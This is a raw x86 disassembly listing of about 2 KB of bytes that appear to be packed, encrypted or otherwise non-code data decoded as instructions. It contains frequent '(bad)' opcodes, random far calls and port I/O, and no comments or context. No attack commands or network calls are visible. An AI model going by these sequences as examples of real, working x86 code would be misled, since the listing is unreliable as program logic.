  429e9e:	and    ebp,edx
  429ea0:	out    dx,eax
  429ea1:	(bad)  
  429ea2:	pop    ebx
  429ea3:	adc    ecx,DWORD PTR [edi-0x45]
  429ea6:	xor    DWORD PTR [edi-0x35],ebx
  429ea9:	shr    BYTE PTR ds:0x2e908fb4,0xce
  429eb0:	ins    DWORD PTR es:[edi],dx
  429eb1:	ret    
  429eb2:	test   al,0x1f
  429eb4:	call   0x7547:0x87842260
  429ebb:	mov    esp,0x8793f881
  429ec0:	fs stos BYTE PTR es:[edi],al
  429ec2:	xchg   ebx,eax
  429ec3:	test   eax,0x136c881f
  429ec8:	xor    DWORD PTR es:0x55304086,0xffffffd7
  429ed0:	fwait
  429ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ed2:	scas   al,BYTE PTR es:[edi]
  429ed3:	push   ebp
  429ed4:	pop    ecx
  429ed5:	jp     0x429e64
  429ed7:	clc    
  429ed8:	retf   
  429ed9:	lods   eax,DWORD PTR ds:[esi]
  429eda:	pop    edx
  429edb:	mov    ecx,0xa94058a0
  429ee0:	pop    eax
  429ee1:	jl     0x429ef7
  429ee3:	lea    ecx,[ecx+0x55]
  429ee6:	mov    dh,0x70
  429ee8:	dec    edx
  429ee9:	push   ecx
  429eea:	test   eax,0xd16671bc
  429eef:	lds    ebx,FWORD PTR [eax-0x2a]
  429ef2:	pop    edi
  429ef3:	or     edx,esp
  429ef5:	outs   dx,BYTE PTR ds:[esi]
  429ef6:	or     eax,0xe49d1709
  429efb:	adc    eax,DWORD PTR [ebx+0x68]
  429efe:	xchg   ebx,eax
  429eff:	mov    dh,0xab
  429f01:	test   BYTE PTR [eax-0x5f6fa4a6],bl
  429f07:	repnz shl DWORD PTR [eax+0x5],cl
  429f0b:	dec    cl
  429f0d:	sub    BYTE PTR [ecx],bh
  429f0f:	jb     0x429f40
  429f11:	inc    DWORD PTR [ebx-0x4ed9d471]
  429f17:	jmp    0x429eb6
  429f19:	push   cs
  429f1a:	pop    ss
  429f1b:	jge    0x429ebf
  429f1d:	mov    dl,0xd5
  429f1f:	(bad)  
  429f20:	fld    TBYTE PTR [ecx]
  429f22:	arpl   WORD PTR [ecx+0x13f0f8d2],bx
  429f28:	pusha  
  429f29:	push   ds
  429f2a:	in     al,0xd3
  429f2c:	cmp    eax,0x7b1e81bf
  429f31:	jg     0x429f5b
  429f33:	mov    eax,ds:0xca41aad7
  429f38:	fnstsw WORD PTR [edi-0x5352e159]
  429f3e:	outs   dx,BYTE PTR ds:[esi]
  429f3f:	stos   BYTE PTR es:[edi],al
  429f40:	dec    esi
	...
  429fb1:	add    BYTE PTR [eax],al
  429fb3:	add    cl,ah
  429fb5:	in     al,dx
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x32526d7b]
  429fc2:	pushf  
  429fc3:	sub    esp,ecx
  429fc5:	mov    esp,0xf50001
  429fca:	add    BYTE PTR [eax],al
  429fcc:	ds ins BYTE PTR es:[edi],dx
  429fce:	cld    
  429fcf:	ret    0x5b5c
  429fd2:	pop    ss
  429fd3:	pop    ebx
  429fd4:	jnp    0x429ff0
  429fd6:	call   0x2935:0xbd79fd9e
  429fdd:	sub    BYTE PTR [ebx],dh
  429fdf:	cmp    DWORD PTR [edi+0x35],ebp
  429fe2:	shr    ebp,cl
  429fe4:	or     edi,esp
  429fe6:	mov    ah,BYTE PTR [esi+edi*4+0xb]
  429fea:	pop    ss
  429feb:	xchg   DWORD PTR [edi-0x3f45e8ce],esp
  429ff1:	stos   BYTE PTR es:[edi],al
  429ff2:	in     eax,0x55
  429ff4:	sahf   
  429ff5:	popf   
  429ff6:	dec    edi
  429ff7:	out    0x28,eax
  429ff9:	cmp    dl,bh
  429ffb:	imul   esp,DWORD PTR [ecx-0x72006c7a],0x3a32c8e7
  42a005:	jp     0x429fde
  42a007:	repz imul esp
  42a00a:	xchg   ebp,eax
  42a00b:	btr    DWORD PTR [ebp-0x19],ebp
  42a00f:	std    
  42a010:	and    esp,DWORD PTR [esi-0x4c]
  42a013:	xor    eax,0xe348518e
  42a018:	imul   ebx,esp,0x69
  42a01b:	xchg   ecx,eax
  42a01c:	outs   dx,BYTE PTR ds:[esi]
  42a01d:	xchg   edx,eax
  42a01e:	push   ds
  42a01f:	ja     0x42a072
  42a021:	cmp    BYTE PTR [edx-0x4ddbe301],0x3b
  42a028:	pop    ecx
  42a029:	pop    ebp
  42a02a:	add    eax,0x2e2c6838
  42a02f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a030:	jmp    0x5ac8edbe
  42a035:	push   0x34
  42a037:	dec    esp
  42a038:	sub    bl,BYTE PTR [esi]
  42a03a:	test   DWORD PTR [edi],edx
  42a03c:	and    al,bl
  42a03e:	adc    DWORD PTR ds:0x24771503,eax
  42a044:	add    cl,dh
  42a046:	push   ebp
  42a047:	popa   
  42a048:	(bad)  
  42a049:	iret   
  42a04a:	loopne 0x42a029
  42a04c:	scas   al,BYTE PTR es:[edi]
  42a04d:	jl     0x42a0c8
  42a04f:	mov    BYTE PTR [ebp-0x57],dl
  42a052:	inc    ebx
  42a053:	push   edi
  42a054:	mov    bh,0x60
  42a056:	add    DWORD PTR [eax+0x3d40c4b1],edx
  42a05c:	mov    dh,0x5a
  42a05e:	out    dx,al
  42a05f:	stos   DWORD PTR es:[edi],eax
  42a060:	enter  0xa549,0x90
  42a064:	dec    esp
  42a065:	cmp    al,dh
  42a067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a068:	and    BYTE PTR [eax+0x7e32fdae],ah
  42a06e:	add    ebp,DWORD PTR [ebx-0x351d6545]
  42a074:	rol    BYTE PTR [edx-0x38d8000b],0x24
  42a07b:	cld    
  42a07c:	sub    eax,0xb2dc01a1
  42a081:	xor    BYTE PTR [eax],dl
  42a083:	ja     0x42a0bf
  42a085:	fldenv [ecx]
  42a087:	mov    bl,0xed
  42a089:	xchg   ebp,eax
  42a08a:	inc    edx
  42a08b:	xor    al,0x7d
  42a08d:	jae    0x42a049
  42a08f:	mov    cl,0xfb
  42a091:	push   esp
  42a092:	xchg   ebp,eax
  42a093:	mov    bl,0xdb
  42a095:	int    0x28
  42a097:	mov    ebx,0xe62d8327
  42a09c:	mov    cl,0x52
  42a09e:	mov    esi,0xc8ad16e6
  42a0a3:	(bad)  
  42a0a4:	dec    DWORD PTR [edx-0x642bd931]
  42a0aa:	or     ecx,DWORD PTR [edi-0x4387cd6d]
  42a0b0:	sub    eax,0xbbc13d0e
  42a0b5:	cmp    esi,DWORD PTR [ecx-0x1712786b]
  42a0bb:	addr16 (bad) 
  42a0bd:	push   edx
  42a0be:	add    ecx,ecx
  42a0c0:	fld    QWORD PTR [eax]
	...
  42a132:	add    BYTE PTR [eax],al
  42a134:	push   esi
  42a135:	xchg   ebp,edi
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	pop    ecx
  42a141:	dec    edx
  42a142:	stos   BYTE PTR es:[edi],al
  42a143:	push   esi
  42a144:	(bad)  
  42a145:	mov    ebp,0xf50001
  42a14a:	add    BYTE PTR [eax],al
  42a14c:	mov    cl,0xd9
  42a14e:	mov    dh,BYTE PTR [ebp+0x5ed7bf8d]
  42a154:	out    dx,al
  42a155:	xchg   edx,eax
  42a156:	pusha  
  42a157:	sbb    ebp,DWORD PTR [ecx]
  42a159:	in     al,dx
  42a15a:	mov    esi,0xaa13232f
  42a15f:	lods   al,BYTE PTR ds:[esi]
  42a160:	or     eax,0x4988e9bd
  42a165:	jp     0x42a117
  42a167:	and    eax,0x318f6e40
  42a16c:	ins    BYTE PTR es:[edi],dx
  42a16d:	outs   dx,DWORD PTR ds:[esi]
  42a16e:	fs dec ebp
  42a170:	dec    esp
  42a171:	stos   DWORD PTR es:[edi],eax
  42a172:	xchg   ebx,eax
  42a173:	xchg   edx,eax
  42a174:	lock mov esp,0xbf41ea82
  42a17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a17b:	lods   eax,DWORD PTR ds:[esi]
  42a17c:	es pusha 
  42a17e:	ins    BYTE PTR es:[edi],dx
  42a17f:	jbe    0x42a1e6
  42a181:	cs mov esi,esp
  42a184:	or     eax,0x6439954
  42a189:	nop
  42a18a:	iret   
  42a18b:	sub    esi,DWORD PTR [esi+0x76aeddc6]
  42a191:	sbb    DWORD PTR [ecx],ebx
  42a193:	sub    DWORD PTR [edi],edi
  42a195:	jmp    0x1f1a:0x6d87f8a8
  42a19c:	add    ecx,DWORD PTR [esp+ecx*8+0x55f667c7]
  42a1a3:	sbb    DWORD PTR [ebx-0x6e],ebp
  42a1a6:	inc    esp
  42a1a7:	pop    ds
  42a1a8:	xchg   esp,eax
  42a1a9:	in     eax,0xb2
  42a1ab:	cld    
  42a1ac:	cwde   
  42a1ad:	adc    ebx,esp
  42a1af:	js     0x42a1ba
  42a1b1:	imul   edi,DWORD PTR [ebx],0xc66cc11a
  42a1b7:	mov    esi,0x8525b139
  42a1bc:	sub    ecx,ebx
  42a1be:	dec    edx
  42a1bf:	jmp    0x42a199
  42a1c1:	sub    al,0xd9
  42a1c3:	sbb    DWORD PTR [edi+0xd67c62b],ecx
  42a1c9:	imul   esi,DWORD PTR [esi+0x12],0x9b7b53a5
  42a1d0:	ret    
  42a1d1:	and    al,0xaf
  42a1d3:	jo     0x42a1e9
  42a1d5:	aad    0x16
  42a1d7:	xchg   ebp,eax
  42a1d8:	mov    ebx,eax
  42a1da:	mul    BYTE PTR [edx]
  42a1dc:	dec    ebp
  42a1dd:	and    ebx,DWORD PTR ds:0xd8a50c61
  42a1e3:	dec    eax
  42a1e4:	sbb    eax,0x86143e2b
  42a1e9:	ror    dh,1
  42a1eb:	test   BYTE PTR [eax],0xa9
  42a1ee:	(bad)  
  42a1ef:	mov    al,ds:0x9f5a3d9c
  42a1f4:	out    0x56,eax
  42a1f6:	pop    ebx
  42a1f7:	adc    al,0xc2
  42a1f9:	fist   WORD PTR [ebp+0x1a]
  42a1fc:	mov    BYTE PTR [ecx+0x30],al
  42a1ff:	aas    
  42a200:	es stos BYTE PTR es:[edi],al
  42a202:	dec    ebp
  42a203:	push   edi
  42a204:	inc    ecx
  42a205:	mov    esp,0x698eb478
  42a20a:	inc    esi
  42a20b:	sbb    DWORD PTR [edi],esi
  42a20d:	int    0xa4
  42a20f:	leave  
  42a210:	pop    ds
  42a211:	fstp   DWORD PTR [ebx-0x7564cf29]
  42a217:	cmp    al,0x87
  42a219:	stc    
  42a21a:	les    ebp,FWORD PTR [esi+edx*2+0x5]
  42a21e:	dec    ecx
  42a21f:	inc    edx
  42a220:	pop    es
  42a221:	loope  0x42a1e5
  42a223:	(bad)  
  42a224:	adc    al,0xa7
  42a226:	out    0x91,eax
  42a228:	in     eax,dx
  42a229:	adc    ch,0x10
  42a22c:	mov    eax,DWORD PTR [edi-0x49]
  42a22f:	xchg   ecx,eax
  42a230:	stos   DWORD PTR es:[edi],eax
  42a231:	push   es
  42a232:	into   
  42a233:	in     eax,dx
  42a234:	cli    
  42a235:	or     cl,0xa6
  42a238:	pop    ebx
  42a239:	mov    ebp,0x10e75bc5
  42a23e:	shr    BYTE PTR [ebx-0x15],1
	...
  42a2b1:	add    BYTE PTR [eax],al
  42a2b3:	add    al,dh
  42a2b5:	adc    al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0x2f7f8ab9
  42a2c1:	add    edi,edx
  42a2c3:	(bad)  
  42a2c4:	retf   
  42a2c5:	mov    esi,0xf50001
  42a2ca:	add    BYTE PTR [eax],al
  42a2cc:	mov    eax,0x63c8d485
  42a2d1:	aad    0x9b
  42a2d3:	dec    ebp
  42a2d4:	loope  0x42a339
  42a2d6:	lods   al,BYTE PTR ds:[esi]
  42a2d7:	outs   dx,DWORD PTR ds:[esi]
  42a2d8:	adc    al,0x12
  42a2da:	mov    edx,0x722a7e82
  42a2df:	sub    al,0xbf
  42a2e1:	mov    gs,esi
  42a2e3:	mov    bh,0xa
  42a2e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a2e6:	rep outs dx,BYTE PTR ds:[esi]
  42a2e8:	enter  0xa7cf,0xb4
  42a2ec:	ss data16 in al,0xfb
  42a2f0:	in     eax,dx
  42a2f1:	shr    BYTE PTR [edi+0xe],cl
  42a2f4:	out    dx,eax
  42a2f5:	int    0x38
  42a2f7:	jg     0x42a315
  42a2f9:	jnp    0x42a35c
  42a2fb:	std    
  42a2fc:	or     bl,BYTE PTR ds:0x74bcfa93
  42a302:	in     eax,0xd1
  42a304:	scas   eax,DWORD PTR es:[edi]
  42a305:	dec    edx
  42a306:	cmp    DWORD PTR [eax+0x812e9e1],esp
  42a30c:	pop    ss
  42a30d:	xchg   DWORD PTR [edx+eax*1+0x23],edx
  42a311:	xor    DWORD PTR [ecx-0x2324cf35],edi
  42a317:	sbb    al,0x77
  42a319:	aam    0x50
  42a31b:	jbe    0x42a2bb
  42a31d:	ror    eax,0xd5
  42a320:	xor    BYTE PTR [edx+0x3d],dl
  42a323:	sub    cl,BYTE PTR [ebp-0x12]
  42a326:	pop    esp
  42a327:	int    0x99
  42a329:	shl    DWORD PTR [eax+0x4392c55],0x93
  42a330:	hlt    
  42a331:	test   al,0xd4
  42a333:	out    dx,al
  42a334:	jl     0x42a367
  42a336:	cld    
  42a337:	pusha  
  42a338:	cmp    ah,BYTE PTR ds:0x21416c8d
  42a33e:	rcr    BYTE PTR [esi-0x6195f54d],0xae
  42a345:	hlt    
  42a346:	pusha  
  42a347:	mov    cl,0x95
  42a349:	cdq    
  42a34a:	mov    ch,0x40
  42a34c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a34d:	and    BYTE PTR [edx],ah
  42a34f:	xor    bl,BYTE PTR ds:0xa7b94662
  42a355:	les    edi,FWORD PTR [esi+edi*4-0x71]
  42a359:	fwait
  42a35a:	stc    
  42a35b:	inc    ebp
  42a35c:	xor    al,0x2c
  42a35e:	in     eax,0x93
  42a360:	fld    QWORD PTR [eax]
  42a362:	call   0x10c3:0xa1ca2eed
  42a369:	add    eax,DWORD PTR [ecx-0xb]
  42a36c:	sbb    DWORD PTR [ecx],0xffffffda
  42a36f:	scas   al,BYTE PTR es:[edi]
  42a370:	lods   eax,DWORD PTR ds:[esi]
  42a371:	mov    esp,0x9033b850
  42a376:	(bad)  
  42a377:	sbb    eax,0x4a1d26af
  42a37c:	or     ah,dh
  42a37e:	pop    edx
  42a37f:	aad    0x91
  42a381:	in     eax,0x84
  42a383:	sbb    bl,BYTE PTR [eax-0x18]
  42a386:	mov    ah,0xf2
  42a388:	pcmpgtw mm3,QWORD PTR [ebp+eax*8-0x50]
  42a38d:	out    0x62,eax
  42a38f:	test   DWORD PTR [ebx+0x21],ebx
  42a392:	std    
  42a393:	and    DWORD PTR [ecx],ecx
  42a395:	add    al,0xd6
  42a397:	sub    eax,0x62aa502f
  42a39c:	out    dx,eax
  42a39d:	repnz mov dl,0x16
  42a3a0:	popa   
  42a3a1:	dec    DWORD PTR [ebx]
  42a3a3:	xor    ecx,DWORD PTR [edi-0x125ba32d]
  42a3a9:	jmp    0x3c4c:0x662d6d22
  42a3b0:	fistp  DWORD PTR [ebx-0x7d30b1e4]
  42a3b6:	mov    edx,0x4c9364a0
  42a3bb:	aas    
  42a3bc:	xor    eax,0xa53de93c
	...
  42a431:	add    BYTE PTR [eax],al
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a45a
  42a441:	xchg   esp,eax
  42a442:	mov    DWORD PTR [eax-0x40],esi
  42a445:	mov    edi,0xf50001
  42a44a:	add    BYTE PTR [eax],al
  42a44c:	push   esp
  42a44d:	outs   dx,DWORD PTR ds:[esi]
  42a44e:	inc    edi
  42a44f:	mov    eax,ds:0xc578522f
  42a454:	pusha  
  42a455:	sub    al,0x3b
  42a457:	fs ds jg 0x42a433
  42a45b:	or     ch,BYTE PTR [esi-0x1648df88]
  42a461:	fs loopne 0x42a411
  42a464:	or     ebx,DWORD PTR [edi]
  42a466:	inc    edx
  42a467:	icebp  
  42a468:	(bad)  
  42a469:	xor    BYTE PTR [edi-0x35],dh
  42a46c:	ret    0x9f57
  42a46f:	clc    
  42a470:	jb     0x42a40b
  42a472:	add    al,0x23
  42a474:	mov    esp,0x835adf62
  42a479:	pop    ecx
  42a47a:	dec    esi
  42a47b:	ud0    ebp,DWORD PTR [eax]
  42a47e:	pop    ebx
  42a47f:	and    ecx,DWORD PTR [ebp+eiz*4-0x75]
  42a483:	das    
  42a484:	mov    cl,BYTE PTR [edx+0x7f]
  42a487:	fidiv  WORD PTR [edx]
  42a489:	jg     0x42a4d0
  42a48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a48c:	mov    ds:0x4fe6932e,al
  42a491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a492:	mov    esi,0xe1e44016
  42a497:	not    DWORD PTR [esi+0x67]
  42a49a:	mov    edx,0xb1f5f9f4
  42a49f:	loopne 0x42a45f
  42a4a1:	add    BYTE PTR [edx-0x1c798f5f],bh
  42a4a7:	(bad)  
  42a4a8:	mov    esi,0x91672216
  42a4ad:	mov    ecx,0xe9714817
  42a4b2:	jbe    0x42a47f
  42a4b4:	cs fstp st(6)
  42a4b7:	into   
  42a4b8:	imul   esi,DWORD PTR [edi+0x617cf43e],0x52
  42a4bf:	lock rcr BYTE PTR [ebx+0x4a5ef91d],1
  42a4c6:	add    ebp,edi
  42a4c8:	call   0xc0d5:0xed04f905
  42a4cf:	(bad)  [edx+edi*2]
  42a4d2:	sbb    eax,0x9d7be5e0
  42a4d7:	fistp  WORD PTR [esi+edi*8]
  42a4da:	mov    al,0x2
  42a4dc:	ss repnz xchg ebx,eax
  42a4df:	or     dh,0xb1
  42a4e2:	cmp    al,0xff
  42a4e4:	(bad)  
  42a4e5:	hlt    
  42a4e6:	dec    ebx
  42a4e7:	add    al,0x5e
  42a4e9:	inc    esp
  42a4ea:	les    esp,FWORD PTR [ebp-0x744cfa96]
  42a4f0:	rcr    BYTE PTR [edi],1
  42a4f2:	mov    BYTE PTR [edx-0xee814cc],ah
  42a4f8:	repnz mov eax,ds
  42a4fb:	jmp    0xb653:0x84c57866
  42a502:	lds    ecx,FWORD PTR [edx+0x7b388acb]
  42a508:	add    ecx,DWORD PTR [ecx+edx*2-0x4c]
  42a50c:	test   al,0x66
  42a50e:	test   DWORD PTR [esi],ebx
  42a510:	mov    ds:0x825efb12,al
  42a515:	(bad)  
  42a516:	out    0x9e,al
  42a518:	mov    ah,0x3d
  42a51a:	push   ss
  42a51b:	or     cl,dh
  42a51d:	dec    ebx
  42a51e:	ror    BYTE PTR ss:[esi],cl
  42a521:	add    eax,DWORD PTR [ecx+ebx*8]
  42a524:	mov    es,edi
  42a526:	jno    0x42a537
  42a528:	mov    ebp,edx
  42a52a:	fisubr WORD PTR [ebp+0x7a5da403]
  42a530:	xchg   ecx,eax
  42a531:	inc    esp
  42a532:	adc    al,0x85
  42a534:	jl     0x42a54e
  42a536:	xor    al,0xd2
  42a538:	pop    ebp
  42a539:	jae    0x42a4c0
  42a53b:	cld    
  42a53c:	scas   eax,DWORD PTR es:[edi]
  42a53d:	jle    0x42a522
  42a53f:	pop    ss
  42a540:	rol    DWORD PTR [eax],0x0
	...
  42a5b3:	add    BYTE PTR [ebp+0x1d],ch
  42a5b6:	out    0xc0,al
  42a5b8:	idiv   bl
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	cld    
  42a5c1:	dec    ebp
  42a5c2:	mov    eax,ds:0x1c0b599
  42a5c7:	add    ch,dh
  42a5c9:	add    BYTE PTR [eax],al
  42a5cb:	add    BYTE PTR [esi+0x14614b7d],bh
  42a5d1:	jg     0x42a633
  42a5d3:	xchg   ecx,eax
  42a5d4:	mov    esp,0x20a9c08a
  42a5d9:	and    BYTE PTR [ebp-0x7abb5d07],bl
  42a5df:	rol    bh,1
  42a5e1:	push   ebp
  42a5e2:	leave  
  42a5e3:	dec    ecx
  42a5e4:	add    BYTE PTR [ecx+0x4],al
  42a5e7:	adc    eax,0x5e63279c
  42a5ec:	dec    ebp
  42a5ed:	dec    eax
  42a5ee:	or     bl,BYTE PTR [edx-0x5697754e]
  42a5f4:	sub    DWORD PTR [edx+0x63],edx
  42a5f7:	fnsave [edx-0x4f92652e]
  42a5fd:	test   BYTE PTR [ecx],ch
  42a5ff:	repz xlat BYTE PTR ds:[ebx]
  42a601:	xlat   BYTE PTR ds:[ebx]
  42a602:	xor    esp,DWORD PTR [edx]
  42a604:	cdq    
  42a605:	and    bh,dl
  42a607:	push   eax
  42a608:	add    al,BYTE PTR [ecx]
  42a60a:	in     al,dx
  42a60b:	retf   
  42a60c:	xchg   ecx,eax
  42a60d:	and    BYTE PTR [esi],cl
  42a60f:	fcom   QWORD PTR [ecx+ecx*1-0x67]
  42a613:	addr16 dec ebx
  42a615:	retf   0xd396
  42a618:	pop    esi
  42a619:	dec    eax
  42a61a:	mov    bl,0x29
  42a61c:	jecxz  0x42a5e0
  42a61e:	call   0x668dcfef
  42a623:	dec    ebp
  42a624:	sub    DWORD PTR [edx-0x7bfaf2b7],esi
  42a62a:	test   BYTE PTR [ecx],ah
  42a62c:	push   0x53f5a99a
  42a631:	cmp    ch,dl
  42a633:	jne    0x42a5e0
  42a635:	or     BYTE PTR [ebx],0x2f
  42a638:	mov    dl,0x4e
  42a63a:	dec    edx
  42a63b:	arpl   WORD PTR [edi-0x6758a376],di
  42a641:	xor    DWORD PTR [ecx],esi
  42a643:	add    BYTE PTR [eax],dl
  42a645:	(bad)  
  42a646:	lock icebp 
  42a648:	dec    ebx
  42a649:	call   0xa6c:0xa9fc5f48
  42a650:	pop    edx
  42a651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a652:	in     eax,0xd7
  42a654:	sub    eax,0xe523008e
  42a659:	add    bl,al
  42a65b:	xlat   BYTE PTR ds:[ebx]
  42a65c:	add    edx,DWORD PTR [ecx+0x2348a35e]
  42a662:	cmp    ch,ah
  42a664:	test   dh,dh
  42a666:	xchg   ebp,eax
  42a667:	mov    WORD PTR [ecx],?
  42a669:	sub    eax,0x1e4a2146
  42a66e:	in     eax,dx
  42a66f:	ret    
  42a670:	rol    DWORD PTR [edx+0x6f],1
  42a673:	das    
  42a674:	push   ecx
  42a675:	sbb    DWORD PTR [eax-0x45],ebx
  42a678:	les    esp,FWORD PTR [esi]
  42a67a:	or     eax,0xd3f04ae0
  42a67f:	mov    dl,ah
  42a681:	dec    ebp
  42a682:	xchg   esp,eax
  42a683:	sbb    bh,BYTE PTR [ebp-0x4a]
  42a686:	mov    eax,ds:0x2f29a137
  42a68b:	int3   
  42a68c:	into   
  42a68d:	xchg   edx,eax
  42a68e:	retf   0x53a0
  42a691:	clc    
  42a692:	into   
  42a693:	imul   edx,DWORD PTR [ebx-0x19],0x8e95df77
  42a69a:	cli    
  42a69b:	adc    edx,esp
  42a69d:	or     DWORD PTR ds:0xdd3728b0,0x2b888821
  42a6a7:	cld    
  42a6a8:	call   0x4c01:0x87029b65
  42a6af:	rcl    BYTE PTR [eax+0x3a],cl
  42a6b2:	mov    bh,0x10
  42a6b4:	dec    edx
  42a6b5:	int3   
  42a6b6:	(bad)  
  42a6b7:	jmp    0x42a72e
  42a6b9:	mov    ah,0xbd
  42a6bb:	into   
  42a6bc:	dec    ebx
  42a6bd:	push   esp
  42a6be:	mov    ebx,0x33aa
	...
  42a733:	add    BYTE PTR [eax],dh
  42a735:	inc    edx
  42a736:	fbld   TBYTE PTR [edx-0x1]
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	repz mov cx,0xaa96
  42a745:	rol    DWORD PTR [ecx],0x0
  42a748:	cmc    
  42a749:	add    BYTE PTR [eax],al
  42a74b:	add    BYTE PTR [ebp+0x16],dh
  42a74e:	(bad)  
  42a74f:	jge    0x42a7ac
  42a751:	and    al,BYTE PTR [ecx+0x75]
  42a754:	push   esi
  42a755:	pop    esi
  42a756:	std    
  42a757:	xchg   ebx,eax
  42a758:	adc    dl,dh
  42a75a:	in     al,dx
  42a75b:	inc    eax
  42a75c:	jb     0x42a706
  42a75e:	pop    ebx
  42a75f:	jg     0x42a76c
  42a761:	ja     0x42a7a3
  42a763:	out    dx,eax
  42a764:	xor    DWORD PTR [esi+esi*2-0x78],esi
  42a768:	sub    ebp,DWORD PTR ds:0x1673048d
  42a76e:	and    al,0xe1
  42a770:	jbe    0x42a7c0
  42a772:	ds jno 0x42a7c7
  42a775:	sbb    al,0x21
  42a777:	pop    es
  42a778:	sbb    al,BYTE PTR [edx-0x7d]
  42a77b:	cld    
  42a77c:	xor    eax,0x15f5c38b
  42a781:	push   edi
  42a782:	and    ecx,DWORD PTR [ebp+0x7d]
  42a785:	add    ch,BYTE PTR [edi]
  42a787:	outs   dx,DWORD PTR ds:[esi]
  42a788:	adc    BYTE PTR [ebx-0x34be05c4],ah
  42a78e:	mov    dl,0xdc
  42a790:	inc    esi
  42a791:	daa    
  42a792:	hlt    
  42a793:	mov    edi,0x9a9c4db0
  42a798:	aaa    
  42a799:	sub    esp,esp
  42a79b:	jge    0x42a7b8
  42a79d:	sahf   
  42a79e:	push   ebp
  42a79f:	retf   
  42a7a0:	and    BYTE PTR [edi-0x560eb08b],bh
  42a7a6:	out    dx,al
  42a7a7:	hlt    
  42a7a8:	and    esp,DWORD PTR ds:0x88f4b387
  42a7ae:	inc    ecx
  42a7af:	mov    ds:0x57d41b7a,al
  42a7b4:	fisubr WORD PTR ds:0xc961a30
  42a7ba:	lea    esi,[ecx+0x73]
  42a7bd:	loop   0x42a81a
  42a7bf:	xor    BYTE PTR [eax],0x51
  42a7c2:	scas   eax,DWORD PTR es:[edi]
  42a7c3:	outs   dx,BYTE PTR ds:[esi]
  42a7c4:	ja     0x42a809
  42a7c6:	inc    eax
  42a7c7:	ficomp WORD PTR ds:0xfc942d3
  42a7cd:	test   al,0x84
  42a7cf:	pop    ss
  42a7d0:	adc    DWORD PTR [ebx-0x41dbb494],esi
  42a7d6:	shl    esi,0x17
  42a7d9:	lods   eax,DWORD PTR ds:[esi]
  42a7da:	fsub   st(4),st
  42a7dc:	pop    ecx
  42a7dd:	push   cs
  42a7de:	mov    esp,0x3ec5a674
  42a7e3:	pop    esi
  42a7e4:	aam    0x48
  42a7e6:	cmp    al,0xde
  42a7e8:	cmp    eax,0xc4c1bfc7
  42a7ed:	aad    0x46
  42a7ef:	repz imul cl
  42a7f2:	add    eax,0xb7efa0
  42a7f7:	sub    eax,0x888fcecc
  42a7fc:	stos   BYTE PTR es:[edi],al
  42a7fd:	gs push edi
  42a7ff:	mov    ah,0xd6
  42a801:	repnz adc ebp,edx
  42a804:	and    edi,DWORD PTR [esi-0x46f31091]
  42a80a:	sub    eax,0x2dfb7066
  42a80f:	mov    edi,0xef5b8906
  42a814:	xchg   esi,eax
  42a815:	les    ecx,FWORD PTR [edi]
  42a817:	push   ecx
  42a818:	and    esp,DWORD PTR [edi-0x3a]
  42a81b:	outs   dx,BYTE PTR ds:[esi]
  42a81c:	nop
  42a81d:	dec    ecx
  42a81e:	out    dx,al
  42a81f:	add    al,0x7
  42a821:	test   al,0x97
  42a823:	adc    al,0x2c
  42a825:	inc    ebp
  42a826:	push   esi
  42a827:	and    eax,0x830cb43e
  42a82c:	scas   eax,DWORD PTR es:[edi]
  42a82d:	add    al,BYTE PTR [ebx-0x3ba93fec]
  42a833:	inc    edi
  42a834:	ins    DWORD PTR es:[edi],dx
  42a835:	mov    al,ds:0x58583120
  42a83a:	bound  ebp,QWORD PTR [esi+0x5e2a2949]
  42a840:	int    0x0
	...
  42a8b2:	add    BYTE PTR [eax],al
  42a8b4:	push   edi
  42a8b5:	push   0xdf7fdf64
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	adc    edx,ebx
  42a8c2:	aad    0x77
  42a8c4:	lahf   
  42a8c5:	ret    0x1
  42a8c8:	cmc    
  42a8c9:	add    BYTE PTR [eax],al
  42a8cb:	add    BYTE PTR [ecx+edx*1+0x67],al
  42a8cf:	mov    al,0x0
  42a8d1:	push   ss
  42a8d2:	and    BYTE PTR [edx-0x604a0b5b],dl
  42a8d8:	mov    ah,0x41
  42a8da:	ds repz out 0xb5,eax
  42a8de:	movntps XMMWORD PTR [eax-0x77],xmm3
  42a8e2:	addr16 xor al,0xdf
  42a8e5:	loop   0x42a8a4
  42a8e7:	jp     0x42a86d
  42a8e9:	sub    DWORD PTR [ecx+0x13b88bb9],0xffffffb5
  42a8f0:	inc    eax
  42a8f1:	movhps xmm4,QWORD PTR [ecx-0x4e]
  42a8f5:	mov    al,ds:0xdd716312
  42a8fa:	pop    edx
  42a8fb:	mov    ds:0x3820cb52,eax
  42a900:	fist   DWORD PTR [edi+0x421ece3c]
  42a906:	sbb    edi,ebp
  42a908:	pop    eax
  42a909:	repnz and BYTE PTR [edi-0x46],bh
  42a90d:	add    ebp,DWORD PTR [ebp-0x383d6c44]
  42a913:	rol    DWORD PTR [ebx-0x6e5e7669],1
  42a919:	dec    edi
